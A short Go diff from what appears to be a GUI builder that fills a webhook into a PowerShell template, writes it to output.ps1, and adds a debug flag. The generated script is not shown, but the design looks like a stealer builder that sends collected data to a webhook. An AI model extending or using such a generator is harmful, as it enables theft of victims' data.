@@ -13,7 +13,7 @@ import (
 	"fyne.io/fyne/v2"
 )
 
-func CompilePowershellFile(a fyne.App, webhook string) {
+func CompilePowershellFile(a fyne.App, webhook string, debug bool) {
 	cwd, err := os.Getwd()
 	if err != nil {
 		fmt.Println(err)
@@ -23,6 +23,9 @@ func CompilePowershellFile(a fyne.App, webhook string) {
 	}
 	ps1Code := utils.GetPowershellCode()
 	ps1Code = strings.Replace(ps1Code, "YOUR_WEBHOOK_HERE", webhook, -1)
+	if debug {
+		ps1Code = strings.Replace(ps1Code, "$debug = $false", "$debug = $true", -1)
+	}
 	err = os.WriteFile("output.ps1", []byte(ps1Code), 0644)
 	if err != nil {
 		fmt.Println(err)
